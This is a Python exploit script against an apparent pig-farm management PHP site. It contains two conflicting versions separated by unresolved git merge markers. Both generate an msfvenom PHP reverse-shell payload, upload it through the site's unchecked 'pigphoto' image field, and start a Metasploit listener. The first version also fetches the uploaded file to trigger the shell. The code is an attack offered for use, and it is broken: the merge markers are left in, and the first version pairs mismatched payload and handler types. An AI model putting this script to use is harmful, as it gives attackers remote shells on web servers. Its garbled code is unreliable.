<<<<<<< HEAD
import subprocess
import requests
import os
import time

# Configuration
kali_ip = '127.0.0.1'  # Replace with your Kali IP
lport = 4444
payload_file = 'reverse_shell.php'
upload_url = 'http://localhost/pig/add-pig.php'
reverse_shell_url = f'http://localhost/pig/uploadfolder/{payload_file}'

# Step 1: Generate the PHP Reverse Shell Payload
def generate_payload():
    cmd = f"msfvenom -p php/reverse_php LHOST={kali_ip} LPORT={lport} -f raw > {payload_file}"
    subprocess.run(cmd, shell=True, check=True)
    print(f"Generated {payload_file}")

# Step 2: Upload the Payload
def upload_payload():
    with open(payload_file, 'rb') as file:
        files = {
            'pigphoto': (payload_file, file, 'application/x-php')
        }
        data = {
            'submit': 'Upload',
            'pigno': '1234',
            'weight': '150',
            'arrived': '2024-07-04',
            'breed': 'Duroc',
            'remark': 'Healthy',
            'status': 'Good',
            'gender': 'Male'
        }
        response = requests.post(upload_url, data=data, files=files)
        if response.status_code == 200:
            print("Payload uploaded successfully.")
        else:
            print(f"Failed to upload payload. Status code: {response.status_code}")

# Step 3: Setup Metasploit Listener
def start_listener():
    # Command to start Metasploit listener
    metasploit_cmd = f"msfconsole -q -x 'use exploit/multi/handler; set payload php/meterpreter/reverse_tcp; set LHOST {kali_ip}; set LPORT {lport}; exploit'"
    subprocess.Popen(metasploit_cmd, shell=True)
    print("Metasploit listener started.")
    time.sleep(10)  # Wait for listener to start

# Step 4: Access the Reverse Shell
def access_reverse_shell():
    response = requests.get(reverse_shell_url)
    if response.status_code == 200:
        print("Reverse shell accessible.")
    else:
        print(f"Failed to access reverse shell. Status code: {response.status_code}")

# Main Execution
def main():
    generate_payload()
    upload_payload()
    start_listener()
    access_reverse_shell()
=======
import os
import subprocess
import tempfile
import requests

def generate_php_payload(lhost, lport):
    payload_path = "reverse.php"
    cmd = [
        "msfvenom", "-p", "php/meterpreter/reverse_tcp",
        f"LHOST={lhost}", f"LPORT={lport}", "-f", "raw", "-o", payload_path
    ]
    subprocess.run(cmd, check=True)
    print(f"Payload generated at {payload_path}")
    return payload_path

def upload_file(url, data, files):
    response = requests.post(url, data=data, files=files)
    if response.status_code == 200:
        print("File uploaded successfully.")
    else:
        print("Failed to upload file.")
    return response

def setup_metasploit_listener(lhost, lport):
    with tempfile.NamedTemporaryFile(delete=False) as resource_file:
        resource_file.write(f"""
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST {lhost}
set LPORT {lport}
exploit
""".strip().encode('utf-8'))
        resource_path = resource_file.name
    
    try:
        cmd = ["msfconsole", "-r", resource_path]
        subprocess.run(cmd, check=True, text=True)
    finally:
        os.remove(resource_path)


def main():
    lhost = "127.0.0.1"  
    lport = "4444"
    upload_url = "http://localhost/pig/add-pig.php"
    data = {
        'submit': 'Upload',
        'pigno': '1234',
        'weight': '150',
        'arrived': '2024-07-04',
        'breed': 'Duroc',
        'remark': 'Healthy',
        'status': 'Good',
        'gender': 'Male'
    }

    print("Generating PHP payload...")
    payload_path = generate_php_payload(lhost, lport)

    print("Uploading payload...")
    files = {
        'pigphoto': ('reverse.php', open(payload_path, 'rb'), 'application/x-php')
    }
    upload_response = upload_file(upload_url, data, files)

    print("Setting up Metasploit listener...")
    setup_metasploit_listener(lhost, lport)

    print(f"Upload the PHP payload to the vulnerable application and trigger it.")
    print(f"Payload URL: {upload_url}")
>>>>>>> 3e85892 (commit before patching things together)

if __name__ == "__main__":
    main()
